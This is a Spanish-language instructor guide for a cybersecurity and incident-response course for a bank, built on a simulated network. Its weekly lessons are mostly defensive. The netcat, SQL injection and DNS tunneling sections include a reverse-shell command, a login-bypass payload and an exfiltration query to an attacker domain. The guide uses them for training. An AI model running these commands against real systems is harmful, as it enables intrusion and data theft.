# GUIA COMPLETA DEL INSTRUCTOR
## Curso: Ciberseguridad y Respuesta a Incidentes para el BHU
### Plataforma: Tectonic Cyber Range - Infraestructura "Banco del Sol"

---

# INDICE DE ARCHIVOS DEL CURSO

| # | Archivo | Contenido |
|---|---------|-----------|
| 1 | Este archivo | Guia completa del instructor (paso a paso para dar clases) |
| 2 | `01_INSTALACION.md` | Instalacion de Tectonic y dependencias |
| 3 | `02_INFRAESTRUCTURA.md` | Diseno de la red "Banco del Sol" con YAML |
| 4 | `03_CHEATSHEET.md` | Comandos rapidos de todas las herramientas |
| 5 | `04_PLAN_12_SEMANAS.md` | Plan curricular de 36 horas |
| 6 | `escenarios/01_phishing/` | Escenario: Phishing y reverse shell |
| 7 | `escenarios/02_ransomware/` | Escenario: Ransomware con cifrado AES |
| 8 | `escenarios/03_ddos/` | Escenario: DDoS SYN flood |
| 9 | `escenarios/04_intrusion/` | Escenario: Intrusion web + lateral movement |
| 10 | `escenarios/05_exfiltracion/` | Escenario: DNS tunneling |
| 11 | `escenarios/06_forensia/` | Escenario: Analisis forense digital |

Cada carpeta de escenario contiene:
- `description.yml` - Descripcion del escenario para Tectonic
- `banco_del_sol_*.yml` - Archivo de edicion del laboratorio
- `ansible/base_config.yml` - Playbook de configuracion base
- `ansible/after_clone.yml` - Playbook post-clonacion (simula el ataque)
- `GUIA_RESPUESTA.md` - Paso a paso del equipo azul

---

# PARTE 1: PREPARACION PREVIA AL CURSO

## 1.1 Requisitos del instructor

Antes de empezar a dar clases necesitas:
- [ ] Haber instalado Tectonic en un servidor Linux (Ubuntu 22.04 LTS recomendado)
- [ ] Tener al menos 16GB de RAM y 100GB de disco libre
- [ ] Docker funcionando correctamente
- [ ] Haber desplegado al menos una vez el escenario base "Banco del Sol"
- [ ] Conocer los comandos basicos de Linux (ls, cd, cat, grep, ssh)
- [ ] Haber recorrido al menos 2 escenarios completos (ataque + defensa)
- [ ] Tener preparadas las diapositivas teoricas (o usar este documento como guion)

## 1.2 Preparar el laboratorio antes de cada clase

```bash
# 1. Activar entorno virtual de Tectonic
source ~/.tectonic/bin/activate

# 2. Ubicarse en el directorio del escenario correspondiente
cd ~/Curso_Tectonic_BHU/escenarios/01_phishing

# 3. Crear las imagenes base (solo la primera vez o si cambiaste algo)
tectonic -c ~/tectonic.ini banco_del_sol_phishing.yml create-images

# 4. Desplegar el escenario
tectonic -c ~/tectonic.ini banco_del_sol_phishing.yml deploy

# 5. Verificar que las maquinas estan corriendo
tectonic -c ~/tectonic.ini banco_del_sol_phishing.yml list

# 6. Obtener IPs y credenciales de acceso
tectonic -c ~/tectonic.ini banco_del_sol_phishing.yml student-access
```

## 1.3 Al finalizar cada clase

```bash
# DESTRUIR el escenario para liberar recursos
tectonic -c ~/tectonic.ini banco_del_sol_phishing.yml destroy
```

---

# PARTE 2: CONTENIDO TEORICO COMPLETO

## SEMANA 1: Fundamentos de Redes y Seguridad

### TEORIA (45 min)

#### 1. Que es una red de computadoras?
Una red es un conjunto de dispositivos interconectados que comparten recursos. En un banco, la red conecta servidores, workstations, cajeros automaticos y dispositivos moviles.

#### 2. Modelo OSI (7 capas)

| Capa | Nombre | Que hace | Ejemplo | Ataque comun |
|------|--------|----------|---------|-------------|
| 7 | Aplicacion | Interfaz con el usuario | HTTP, SMTP, DNS | Phishing, SQL injection |
| 6 | Presentacion | Cifrado, compresion | SSL/TLS, JPEG | SSL stripping |
| 5 | Sesion | Gestiona sesiones | NetBIOS, RPC | Session hijacking |
| 4 | Transporte | Confiable o rapido | TCP, UDP | SYN flood, port scan |
| 3 | Red | Direccionamiento logico | IP, ICMP, routers | IP spoofing, MITM |
| 2 | Enlace | Direccionamiento fisico | Ethernet, switches | ARP spoofing, MAC flooding |
| 1 | Fisico | Transmision electrical | Cables, WiFi | Jamming, cable tapping |

#### 3. Protocolos fundamentales

**TCP vs UDP:**
- TCP: confiable, orientado a conexion (3-way handshake). Usado en HTTP, SSH, FTP, SMTP
- UDP: rapido, sin conexion. Usado en DNS, video streaming, gaming

**El 3-way handshake de TCP:**
```
Cliente -> Servidor:  SYN         ("hola, quiero conectarme")
Servidor -> Cliente:  SYN-ACK     ("ok, yo tambien")
Cliente -> Servidor:  ACK         ("perfecto, empezamos")
```
Esto es clave para entender el ataque SYN flood (capa 4).

**DNS (Domain Name System):**
- Traduce nombres a IPs: www.banco.com -> 190.64.10.5
- Funciona en UDP puerto 53
- Jerarquico: Root -> TLD (.com, .uy) -> Autoritativo -> Local
- Es el protocolo que explota el escenario de exfiltracion por DNS tunneling

**HTTP/HTTPS:**
- HTTP: trafico en claro (puerto 80)
- HTTPS: cifrado con TLS (puerto 443)
- El trafico HTTP se puede inspeccionar; HTTPS no (sin interceptacion)

**SMTP (correo electronico):**
- Envio de emails (puerto 25, 587)
- Los headers del email revelan el origen real del mensaje
- Clave para detectar phishing

#### 4. Tipos de redes

| Tipo | Alcance | Ejemplo en banco |
|------|---------|-----------------|
| LAN | Un edificio | Red del BHU en Plaza Independencia |
| WAN | Ciudad/Pais | Red que conecta sucursales |
| VLAN | Logica dentro de LAN | VLAN de IT, VLAN de Produccion, VLAN de DMZ |
| VPN | Virtual sobre Internet | Acceso remoto de empleados |
| DMZ | Zona intermedia | Servidores web expuestos a Internet |
| SD-WAN | WAN definida por software | conexion moderna entre sucursales |

#### 5. VPN (Virtual Private Network)

**Que es:** Tunnel cifrado a traves de una red publica (Internet) que permite acceder a la red privada de forma segura.

**Tipos de VPN:**
- **IPSec:** Capa 3, muy segura, lenta. Usada en site-to-site.
- **SSL/TLS VPN:** Capa 4-7, mas flexible, accesible desde navegador. Usada en acceso remoto.
- **WireGuard:** Moderna, rapida, codigo abierto. Gana terreno.
- **OpenSource VPN:** Basada en SSL, muy comun.

**Como funciona una VPN:**
```
[PC Empleado] --(cifrado)--> [Internet] --(cifrado)--> [Servidor VPN BHU] --(claro)--> [Red interna BHU]
```

**En el escenario Banco del Sol:**
- vpn-srv (10.0.1.12) simula el servidor VPN
- El empleado se conecta desde su casa, autentica con credenciales
- Se le asigna una IP de la red interna (10.0.2.x)
- Puede acceder a core-bank y db-srv a traves del tunnel

**Controles de seguridad VPN:**
- MFA (autenticacion multifactor) obligatoria
- Certificados de cliente
- Segmentacion: el usuario VPN solo accede a lo que necesita
- Monitoreo de sesiones: horario, volumen de datos, destinos

#### 6. Segmentacion de red

**Por que segmentar?** Si un atacante compromete un equipo en la DMZ, la segmentacion evita que llegue al core bancario.

```
SIN SEGMENTACION:                  CON SEGMENTACION:
[Internet]--[Todos]--[Core]       [Internet]--[DMZ]--[Firewall]--[Interna]--[Core]
   Un atacante llega a todo         El atacante queda atrapado en la DMZ
```

En nuestro escenario:
- **DMZ (10.0.1.0/24):** Servidores expuestos. Si caen, la interna esta protegida.
- **Interna (10.0.2.0/24):** Sistemas criticos. Solo accesible desde la DMZ por puertos especificos.

### PRACTICA (1 hora 15 min)

#### Ejercicio 1.1: Instalar Tectonic ( guiado )

Seguir el archivo `01_INSTALACION.md` paso a paso. Los alumnos deben:
1. Clonar el repositorio de Tectonic
2. Instalar dependencias
3. Configurar Docker
4. Instalar el paquete pip
5. Verificar con `tectonic --help`

#### Ejercicio 1.2: Explorar la infraestructura

El instructor despliega el escenario base y los alumnos:
1. Se conectan por SSH a attack-ws y blue-team-ws
2. Hacen ping entre maquinas
3. Exploran las direcciones IP
4. Ejecutan `ip addr show`, `ip route`, `cat /etc/resolv.conf`
5. Hacen un `nmap` basico contra la red

#### Ejercicio 1.3: Capturar trafico con tcpdump

En blue-team-ws:
```bash
# Ver todo el trafico de la interfaz
sudo tcpdump -i eth0

# Ver solo trafico TCP al puerto 80
sudo tcpdump -i eth0 tcp port 80

# Guardar captura en archivo
sudo tcpdump -i eth0 -w /tmp/ejercicio1.pcap

# Leer el archivo capturado
sudo tcpdump -r /tmp/ejercicio1.pcap
```

### CIERRE (15 min)
- Resolver dudas
- Explicar que la proxima semana empiezan los escenarios de ataque
- Asignar lectura: revisar el `03_CHEATSHEET.md`

---

## SEMANA 2: Herramientas de Analisis de Red

### TEORIA (45 min)

#### 1. Nmap (Network Mapper)

El escaneador de redes mas importante del mundo.

**Tipos de escaneo:**
```bash
# Escaneo basico (ping scan)
nmap -sn 10.0.1.0/24

# Escaneo de puertos rapid
nmap -F 10.0.1.10

# Escaneo completo (todos los puertos)
nmap -p- 10.0.1.10

# Deteccion de servicios y versiones
nmap -sV -sC 10.0.1.10

# Escaneo sigiloso (SYN scan)
nmap -sS 10.0.1.10

# Escaneo de vulnerabilidades
nmap --script vuln 10.0.1.10
```

**Que revela un escaneo:**
- Puertos abiertos = servicios activos
- Servicios y versiones = vulnerabilidades posibles
- Sistema operativo detectado

#### 2. Wireshark / tshark

**Wireshark** (interfaz grafica): analisis visual de paquetes
**tshark** (linea de comandos): analisis en servidor

**Filtros de display en Wireshark:**
```
# Ver solo trafico HTTP
http

# Ver solo trafico de un IP
ip.addr == 10.0.1.10

# Ver solo DNS
dns

# Ver solo conexiones TCP con flags SYN
tcp.flags.syn == 1

# Ver paquetes con datos
frame.len > 0

# Seguir una conversacion TCP completa
Click derecho -> Follow -> TCP Stream
```

**Comandos tshark:**
```bash
# Capturar trafico y guardar
tshark -i eth0 -w /tmp/captura.pcap

# Leer y filtrar
tshark -r /tmp/captura.pcap -Y "http"

# Ver solo DNS queries
tshark -r /tmp/captura.pcap -Y "dns.qry.name"

# Contar paquetes por IP
tshark -r /tmp/captura.pcap -T fields -e ip.src | sort | uniq -c | sort -rn
```

#### 3. Netcat (la navaja suiza)

```bash
# Escuchar en un puerto
nc -lvp 4444

# Conectarse a un puerto
nc 10.0.1.10 80

# Transferir archivos
# Emisor:
nc -lvp 4444 < archivo_secreto.txt
# Receptor:
nc 10.0.1.10 4444 > archivo_recibido.txt

# Shell inversa (para pentesting etico)
# Atacante escucha:
nc -lvp 4444
# Victima ejecuta:
nc 10.0.2.100 4444 -e /bin/bash
```

#### 4. Analisis de logs

**Ubicacion de logs en Linux:**
- `/var/log/auth.log` - Autenticacion (SSH, sudo, login)
- `/var/log/syslog` - Eventos del sistema
- `/var/log/apache2/access.log` - Accesos web (Apache)
- `/var/log/nginx/access.log` - Accesos web (Nginx)
- `/var/log/mail.log` - Correo electronico

**Comandos para analizar logs:**
```bash
# Ultimas 50 lineas de un log
tail -50 /var/log/auth.log

# Buscar errores
grep -i "error\|failed\|denied" /var/log/auth.log

# Contar intentos de login fallidos
grep "Failed password" /var/log/auth.log | wc -l

# Ver intentos desde una IP especifica
grep "10.0.1.100" /var/log/auth.log

# Ver todos los logs de hoy
journalctl --since today
```

### PRACTICA (1 hora 15 min)

#### Ejercicio 2.1: Escaneo de red con Nmap

Desde attack-ws:
```bash
# Descubrir hosts activos
nmap -sn 10.0.1.0/24

# Escanear el servidor web
nmap -sV -sC 10.0.1.10

# Identificar el SO
nmap -O 10.0.1.10

# Buscar vulnerabilidades
nmap --script vuln 10.0.1.10
```

#### Ejercicio 2.2: Analisis de trafico con tshark

En blue-team-ws, mientras se genera trafico:
```bash
# Capturar 100 paquetes
sudo tshark -i eth0 -c 100

# Capturar solo DNS
sudo tshark -i eth0 -Y "dns" -w /tmp/dns.pcap

# Analizar despues
tshark -r /tmp/dns.pcap -T fields -e dns.qry.name | sort -u
```

#### Ejercicio 2.3: Comunicacion con Netcat

Entre dos terminales en attack-ws y blue-team-ws:
```bash
# Terminal 1 (servidor):
nc -lvp 4444

# Terminal 2 (cliente):
echo "Hola desde blue team" | nc 10.0.2.12 4444
```

### CIERRE (15 min)
- Discutir: que vieron en el escaneo? que servicios estan expuestos?
- Proxima semana: primer escenario real de ataque (phishing)

---

## SEMANA 3: Escenario Phishing - Teoria

### TEORIA (45 min)

#### 1. Que es el phishing?

Suplantacion de identidad por correo electronico. El atacante envia un email que parece legitimo para robar credenciales o instalar malware.

**Elementos de un email de phishing:**
- **Remitente falsificado:** parece ser del banco pero el dominio real es diferente
- **Asunto urgente:** "Tu cuenta sera bloqueada", "Actuccion requerida"
- **Link malicioso:** URL que parece legitima pero redirige a un sitio falso
- **Adjunto infectado:** PDF o Word con macro maliciosa
- **Errores ortograficos:** aunque cada vez menos (usando IA)

#### 2. Como detectar phishing

**Analisis del remitente:**
```
De: soporte@bancodelsol.com.uy        <- Dominio real
De: soporte@bancodel-sol.com.uy       <- Falso (guion)
De: soporte@bancodelsol.support        <- Falso (.support)
```

**Analisis de headers:**
Cada email tiene headers que muestran el camino real:
```
Received: from mail.attacker.com (185.x.x.x)
    by mx.banco.com;
    with ESMTP id abc123;
    for <victima@banco.com>;
    date: Mon, 13 Jul 2026 10:30:00 -0300
```
Si el "Received from" no coincide con el dominio declarado, es phishing.

**Indicadores de un link falso:**
- Muestra: www.bancodelsol.com.uy
- Real: www.bancodel-sol.com.uy o bancodelsol.com.uy.malicious.com
- Si pasa el mouse sobre el link, ve la URL real

#### 3. Que pasa despues del click?

Cadena de ataque tipica:
```
1. Empleado recibe email de phishing
2. Empleado hace click en el link
3. Se descarga un archivo (payload)
4. El payload ejecuta un reverse shell
5. El reverse shell conecta al servidor del atacante
6. El atacante tiene control remoto del equipo
```

**Reverse shell:** conexion saliente desde la victima hacia el atacante. El firewall permite conexiones salientes, por eso funciona.

#### 4. Herramientas del escenario

- **swaks:** Swiss Army Knife for SMTP. Envia emails desde linea de comandos
- **Netcat:** Para la reverse shell
- **Python http.server:** Para servir el payload

### PRACTICA (1 hora 15 min) - Ver `escenarios/01_phishing/GUIA_RESPUESTA.md`

El instructor despliega el escenario y guia a los alumnos por la fase de deteccion y analisis.

### CIERRE (15 min)
- Discusion: como preveniriamos esto en BHU?
- Temas: filtros SPF/DKIM/DMARC, capacitacion, reporte de phishing

---

## SEMANA 4: Escenario Phishing - Respuesta

### TEORIA (30 min)

#### Marco de respuesta a incidentes (NIST SP 800-61)

```
1. Preparacion -> 2. Deteccion y Analisis -> 3. Contencion ->
4. Erradicacion -> 5. Recuperacion -> 6. Lecciones Aprendidas
```

#### Fases detalladas:

**1. Preparacion (antes del incidente)**
- Tener herramientas listas
- Tener contactos actualizados
- Tener procedimientos documentados
- Capacitar al equipo

**2. Deteccion y Analisis**
- Que paso? Cuando? Quien esta afectado?
- Es grave? (usar matriz de severidad)
- Hay datos comprometidos?

**3. Contencion**
- Cortar el problema sin destruir evidencia
- Desconectar de red (NO apagar)
- Bloquear cuentas comprometidas
- Aislar el sistema afectado

**4. Erradicacion**
- Eliminar la causa raiz
- Parchar vulnerabilidades
- Cambiar credenciales
- Verificar que no hay persistencia

**5. Recuperacion**
- Restaurar servicios
- Verificar integridad
- Monitorear intensivamente

**6. Lecciones Aprendidas**
- Que fallo? Que funciono?
- Documentar para futuros incidentes

### PRACTICA (1 hora 30 min) - Continuacion del escenario

Ejercicios guiados:
1. Buscar el email malicioso en /var/log/mail.log
2. Extraer el remitente real con grep
3. Identificar el payload descargado
4. Encontrar el proceso de la reverse shell con ps y netstat
5. Aislar la maquina con iptables
6. Eliminar el proceso malicioso
7. Documentar todo en un informe

### CIERRE (30 min)
- Cada grupo presenta su informe de incidente
- Discusion grupal

---

## SEMANA 5: Ransomware - Teoria y Deteccion

### TEORIA (45 min)

#### 1. Que es un ransomware?

Malware que cifra los archivos de la victima y pide un rescate (usualmente en criptomonedas) para la clave de descifrado.

**Tipos de ransomware:**
- **Crypto ransomware:** Cifra archivos individuales. El mas comun (WannaCry, Ryuk, LockBit)
- **Locker ransomware:** Bloquea el acceso al sistema completo
- **Double extortion:** Cifra Y amenaza con publicar los datos robados
- **RaaS (Ransomware as a Service):** Plataforma de alquiler de ransomware

#### 2. Como funciona WannaCry (el mas famoso)

```
1. Explota EternalBlue (vulnerabilidad SMB - MS17-010)
2. Se propaga automaticamente por la red
3. Cifra archivos con AES-256 + RSA-2048
4. Deja nota de rescate: HOW TO DECRYPT FILES.txt
5. Intenta conectarse a un dominio kill-switch (si existe, se detiene)
```

#### 3. Como detectar ransomware en progreso

**Sintomas:**
- Archivos renombrados masivamente (extensiones .encrypted, .locked, .WNCRY)
- Proceso de alto consumo de CPU (cifrado)
- Muchos archivos modificados en poco tiempo
- Aparece un archivo de texto con instrucciones de rescate
- Intentos fallidos de acceder a archivos

**Deteccion tecnica:**
```bash
# Ver archivos modificados recientemente
find /srv -mmin -5 -type f

# Ver procesos con alto CPU
ps aux --sort=-%cpu | head

# Buscar archivos con extensiones de ransomware
find / -name "*.WNCRY" -o -name "*.encrypted" -o -name "*.locked"

# Monitoreo continuo de archivos (inotifywait)
inotifywait -m -r /srv/banco/documentos/
```

#### 4. Que NO hacer
- NO apagar el equipo (pierdes la evidencia en memoria)
- NO pagar el rescate (no hay garantia de descifrado)
- NO conectar backup al sistema afectado (el ransomware puede cifrarlos tambien)
- NO comunicar internamente por email (puede estar comprometido)

### PRACTICA (1 hora 15 min)

1. Desplegar escenario `02_ransomware`
2. Observar como se cifran los archivos en tiempo real
3. Detectar los indicadores de compromiso
4. Aislar el sistema afectado
5. Verificar que los backups estan intactos

### CIERRE (15 min)
- Discusion: tenemos backups en BHU? estan desconectados?

---

## SEMANA 6: Ransomware - Recuperacion y Continuidad

### TEORIA (30 min)

#### Plan de Continuidad de Negocio (BCP)

**Preguntas clave:**
- Cuanto tiempo podemos estar sin el sistema core?
- Tenemos backups recientes? Estan offline?
- Podemos operar manualmente?
- A quién avisamos? (CERTuy, BCU, clientes)

**Regla 3-2-1 de backups:**
- **3** copias de los datos
- **2** medios diferentes (disco local + cinta/cloud)
- **1** copia fuera del sitio (offsite/offline)

#### Reporte obligatorio

Si hay ransomware en un banco uruguayo:
1. **CERTuy** dentro de 24 horas (Ley 20.212, art. 78)
2. **BCU Supervision** segun circulares de ciberseguridad
3. **URCDP** si hay datos personales comprometidos (72 horas)
4. **Cibercrimen** si se desea denuncia penal

### PRACTICA (1 hora 30 min)

1. Restaurar archivos desde backup
2. Verificar integridad de los archivos restaurados (checksums)
3. Generar reporte de incidente para CERTuy (usando template)
4. Generar notificacion a URCDP (si aplica)

### CIERRE (30 min)
- Ejercicio de redaccion del reporte
- Discusion: que controles preventivos implementariamos?

---

## SEMANA 7: DDoS - Teoria y Defensa

### TEORIA (45 min)

#### 1. Que es un DDoS?

Distributed Denial of Service. Ataque que busca hacer indisponible un servicio saturandolo de trafico.

**Tipos:**
- **Volumetrico:** Saturacion de ancho de banda (UDP flood, ICMP flood)
- **Protocolo:** Explotan debilidades de protocolos (SYN flood)
- **Aplicacion:** Atacan la logica del servicio (Slowloris, HTTP flood)

#### 2. SYN Flood (el mas comun)

```
Normal:  Cliente -> SYN -> Servidor -> SYN-ACK -> ACK -> Conexion establecida
Ataque:  Cliente -> SYN -> Servidor -> SYN-ACK -> [nunca responde]
         Cliente -> SYN -> Servidor -> SYN-ACK -> [nunca responde]
         ... miles de SYN sin completar el handshake
         
El servidor mantiene conexiones半-abiertas y se queda sin recursos
```

**SYN Cookies:** Mecanismo que permite al servidor responder SYN-ACK sin reservar memoria hasta que se complete el handshake.

#### 3. Slowloris

Ataque de capa 7. Abre muchas conexiones HTTP y las mantiene abiertas el maximo tiempo posible enviando headers parciales.

```
Cliente envia: GET / HTTP/1.1\r\n
Cliente envia: Host: banco.com\r\n
(pausa de 10 segundos)
Cliente envia: X-custom: valor\r\n
(pausa de 10 segundos)
... asi sucesivamente, manteniendo la conexion viva
```

El servidor tiene un limite de conexiones simultaneas y se queda sin espacio para clientes legitimos.

### PRACTICA (1 hora 15 min)

1. Desplegar escenario `03_ddos`
2. Observar el trafico normal con tshark
3. Iniciar el SYN flood desde attack-ws
4. Monitorear como degrada el servicio
5. Implementar reglas iptables de mitigacion
6. Verificar la recuperacion

### CIERRE (15 min)
- Discusion: que harian si el portal de banca en linea cae un lunes a las 9am?

---

## SEMANA 8: Seguridad de Aplicaciones Web

### TEORIA (45 min)

#### 1. OWASP Top 10 (las 10 vulnerabilidades mas comunes)

1. **Injection (SQL, XSS, Command):** Inyectar codigo en consultas
2. **Broken Authentication:** Autenticacion debil
3. **Sensitive Data Exposure:** Datos expuestos sin cifrar
4. **XML External Entities (XXE):** Procesamiento XML inseguro
5. **Broken Access Control:** Acceso a funcionalidades sin autorizacion
6. **Security Misconfiguration:** Configuracion por defecto insegura
7. **Cross-Site Scripting (XSS):** Inyeccion de scripts en paginas
8. **Insecure Deserialization:** Deserializacion no segura de objetos
9. **Using Components with Known Vulnerabilities:** Software con CVEs conocidos
10. **Insufficient Logging:** Falta de registro de eventos

#### 2. SQL Injection (Inyeccion SQL)

**Como funciona:**
```
Login normal:  usuario: juancarlos  pass: ****
Login malicioso: usuario: admin'--  pass: (cualquiera)

La consulta SQL original:
SELECT * FROM users WHERE user='juancarlos' AND pass='****'

Se convierte en:
SELECT * FROM users WHERE user='admin'--' AND pass='****'
                                          ^ Esto se comenta
 resultado: devuelve el usuario admin sin verificar password
```

**Prevencion:** Consultas parametrizadas (nunca concatenar strings en SQL)

#### 3. Movimiento lateral

Despues de comprometer una maquina en la DMZ, el atacante busca llegar a la red interna:
- Usa credenciales robadas
- Explota confianza entre servidores
- Busca credenciales en archivos de configuracion
- Usa herramientas de escalamiento de privilegios

### PRACTICA (1 hora 15 min)

1. Desplegar escenario `04_intrusion`
2. Encontrar la aplicacion vulnerable
3. Ejecutar ataque de SQLi con sqlmap
4. Extraer credenciales de la base de datos
5. Usar esas credenciales para SSH a db-srv
6. Detectar la intrusione desde blue-team-ws

### CIERRE (15 min)
- Discusion: como proteger las aplicaciones web del BHU?

---

## SEMANA 9: Exfiltracion de Datos

### TEORIA (45 min)

#### 1. Que es la exfiltracion?

Robo de datos que salen de la organizacion de forma encubierta.

**Canales de exfiltracion:**
- **DNS tunneling:** Codifica datos en consultas DNS
- **HTTPS:** Se mezcla con trafico legitimo
- **Steganografia:** Oculta datos dentro de imagenes
- **ICMP:** Datos dentro de paquetes ping
- **Redes sociales:** Sube archivos a plataformas publicas
- **Email:** Envia datos como adjuntos

#### 2. DNS Tunneling en detalle

```
[db-srv] --[datos codificados en DNS]--> [DNS externo] --[datos]--> [atacante]

Ejemplo de consulta DNS con datos:
consulta: aGVsbG8gZnJvbSBiYW5jby5jb20=.tunnel.attacker.com
              ^^^^^^^^^^^^^^^^^^^^^^^
              "hello from banco.com" en Base64
```

**Como detectarlo:**
- Volumen inusual de consultas DNS
- Consultas a dominios largos y aleatorios
- Mucho trafico TXT en DNS
- Consultas DNS fuera de horario laboral

#### 3. Proteccion de datos personales (Ley 18.331)

Si se exfiltran datos personales de clientes del BHU:
- **URCDP:** notificar en 72 horas
- **Clientes afectados:** notificar inmediatamente
- **Multas:** hasta 500.000 UI
- **Reputacional:** dano incalculable

### PRACTICA (1 hora 15 min)

1. Desplegar escenario `05_exfiltracion`
2. Capturar trafico DNS con tshark
3. Identificar el patron anormal de DNS
4. Decodificar los datos exfiltrados
5. Determinar el alcance (que datos se robaron)

### CIERRE (15 min)
- Ejercicio: redactar la notificacion a URCDP

---

## SEMANA 10: Analisis Forense Digital

### TEORIA (45 min)

#### 1. Que es la forense digital?

Recuperacion y analisis de evidencia digital para determinar que paso, quien lo hizo, y cuando.

**Principios fundamentales:**
- **Integridad:** No alterar la evidencia
- **Cadena de custodia:** Documentar quien toco que y cuando
- **Reproducibilidad:** Otro analista deberia llegar a los mismos resultados

#### 2. Tipos de evidencia

| Tipo | Ejemplo | Volatilidad |
|------|---------|-------------|
| Volatil | Memoria RAM, procesos activos, conexiones | Se pierde al apagar |
| Semi-volatil | Logs, archivos temporales | Se sobreescribe con tiempo |
| No volatil | Discos duros, archivos | Permanece hasta borrar |

**Orden de adquisicion (del mas volatil al menos):**
1. Memoria RAM
2. Estado de red (conexiones, rutas)
3. Procesos en ejecucion
4. Disco duro

#### 3. Herramientas forenses

**Volatility3 (analisis de memoria):**
```bash
# Procesos en memoria
vol -f memdump.raw windows.pslist

# Conexiones de red
vol -f memdump.raw windows.netscan

# DLLs cargadas
vol -f memdump.raw windows.dlllist

# Comandos ejecutados
vol -f memdump.raw windows.cmdline
```

**Sleuth Kit (analisis de disco):**
```bash
# Archivos eliminados (pero recuperables)
fls -r imagen.dd

# Recuperar un archivo especifico
icat imagen.dd inode_number > archivo_recuperado.txt

# Tabla de particiones
mmls imagen.dd
```

**Foremost (carving de archivos):**
```bash
# Recuperar archivos borrados
foremost -i imagen.dd -o salida/
```

### PRACTICA (1 hora 15 min)

1. Desplegar escenario `06_forensia`
2. Adquirir evidencia de db-srv
3. Analizar logs con grep
4. Buscar archivos eliminados con foremost
5. Reconstruir la linea de tiempo del ataque

### CIERRE (15 min)
- Discusion: que tan importante es la forensse para el BHU?

---

## SEMANA 11: Reporte y Comunicacion de Crisis

### TEORIA (45 min)

#### 1. Como redactar un informe de incidente

**Estructura del informe:**
1. Resumen ejecutivo (1 parrafo)
2. Fecha y hora de deteccion
3. Tipo de incidente
4. Sistemas afectados
5. Datos comprometidos (si aplica)
6. Acciones tomadas
7. Timeline de eventos
8. Impacto estimado
9. Recomendaciones
10. Anexos (evidencia, logs)

#### 2. A quien avisar

```
Incidente detectado
    |
    +-> CERTuy (24 horas) - art. 78 Ley 20.212
    |
    +-> URCDP (72 horas) - si hay datos personales
    |
    +-> Cibercrimen - si hay delito
    |
    +-> BCU Supervision - si es relevante para la entidad
    |
    +-> Directorio/Gerencia - inmediatamente si es grave
    |
    +-> Clientes - si sus datos estan comprometidos
```

#### 3. Gestion de comunicacion

- **Internamente:** No usar email si esta comprometido. Usar telefono o WhatsApp.
- **Externamente:** Coordinar con prensa/legales antes de cualquier declaracion.
- **A clientes:** Lenguaje claro, que paso, que se esta haciendo, que pueden hacer ellos.

### PRACTICA (1 hora 15 min)

1. Redactar informe de incidente para un caso ficticio
2. Simular llamada a CERTuy
3. Redactar notificacion a URCDP
4. Preparar comunicado para clientes

### CIERRE (15 min)
- Presentacion de informes por grupos

---

## SEMANA 12: Simulacro de Crisis Final

### TEORIA (15 min)

Explicacion del ejercicio integrador:
- Se despliegan 2 escenarios simultaneos
- Los alumnos deben detectar, responder y documentar
- Se evalua: velocidad, efectividad, documentacion, trabajo en equipo

### PRACTICA (2 horas)

**Ejercicio integrador:**
Se ejecutan secuencialmente:
1. Un phishing que instala un reverse shell (Sem 3-4)
2. Desde ahi, movimiento lateral a db-srv (Sem 8)
3. Exfiltracion de datos por DNS (Sem 9)
4. Mientras tanto, un DDoS al servidor web (Sem 7)

Los alumnos deben:
1. Detectar todos los incidentes
2. Priorizar y responder
3. Contener cada amenaza
4. Documentar todo
5. Generar los reportes regulatorios
6. Presentar ante la "Direccion"

### CIERRE Y EVALUACION (45 min)

- Presentacion final de cada grupo
- Retroalimentacion del instructor
- Entrega de certificados de participacion

---

# PARTE 3: CONTENIDO TEORICO ADICIONAL

## A. Comandos de Windows (para comparar con Linux)

Los alumnos deben conocer las equivalencias en caso de encontrar entornos Windows:

| Accion | Linux | Windows |
|--------|-------|---------|
| Ver IP | `ip addr show` | `ipconfig /all` |
| Ver rutas | `ip route` | `route print` |
| Ver conexiones | `ss -tuln` | `netstat -ano` |
| Ver procesos | `ps aux` | `tasklist` o `Get-Process` |
| Matar proceso | `kill -9 PID` | `taskkill /PID xxx /F` |
| Buscar archivos | `find / -name "*.txt"` | `dir /s C:\*.txt` |
| Ver contenido | `cat archivo.txt` | `type archivo.txt` o `Get-Content` |
| Buscar texto | `grep "texto" archivo` | `findstr "texto" archivo` |
| Ver puertos | `ss -tuln` | `netstat -ano \| findstr LISTEN` |
| Traceroute | `traceroute 10.0.1.1` | `tracert 10.0.1.1` |
| DNS lookup | `dig dominio.com` | `nslookup dominio.com` |
| Ver horarios | `date` | `date /t` |
| Ver usuarios | `cat /etc/passwd` | `net user` |
| Ver logs | `journalctl` | `Event Viewer` (eventvwr.msc) |
| Firewall | `iptables -L` | `netsh advfirewall show rule name=all` |

## B. Protocolos de seguridad de red

### SSL/TLS
- Cifra la comunicacion entre cliente y servidor
- Certificados digitales verifican la identidad
- Version actual recomendada: TLS 1.3
- Vulnerabilidades: POODLE (SSL 3.0), BEAST (TLS 1.0)

### SSH (Secure Shell)
- Acceso remoto cifrado a servidores
- Puerto 22 por defecto
- Autenticacion por clave publica/privada (recomendado) o password
- En el BHU: todos los servidores deben solo aceptar SSH con clave

### Firewall
- Filtra trafico entrante y saliente
- Funciona con reglas: permitir o denegar por IP, puerto, protocolo
- Tipos: stateless (reglas fijas) y stateful (recuerda el estado de conexiones)

### IDS/IPS
- **IDS (Intrusion Detection System):** Detecta y alerta
- **IPS (Intrusion Prevention System):** Detecta y bloquea automaticamente
- Herramientas: Snort, Suricata, Zeek (antes Bro)

### SIEM (Security Information and Event Management)
- Centraliza logs de todos los sistemas
- Correlaciona eventos para detectar amenazas
- Genera alertas automaticas
- En el escenario: Elastic Security cumple este rol
- Herramientas: Elastic SIEM, Splunk, QRadar, ArcSight

## C. Marcos de referencia

### MITRE ATT&CK
Framework que describe tecnicas de ataque. Util para mapear que esta haciendo un atacante:

```
Reconocimiento -> Acceso Inicial -> Ejecucion -> Persistencia ->
Escalamiento de Privilegios -> Evasion -> Acceso a Credenciales ->
Descubrimiento -> Movimiento Lateral -> Recoleccion ->
Exfiltracion -> C2 (Command and Control)
```

### NIST Cybersecurity Framework
5 funciones: Identificar -> Proteger -> Detectar -> Responder -> Recuperar

### Marco de Ciberseguridad AGESIC
Requisitos obligatorios para entidades publicas y privadas vinculadas a sectores criticos en Uruguay.

---

# PARTE 4: RECURSOS PARA EL INSTRUCTOR

## Enlaces importantes
- Tectonic: https://github.com/GSI-Fing-Udelar/tectonic
- CERTuy: https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica
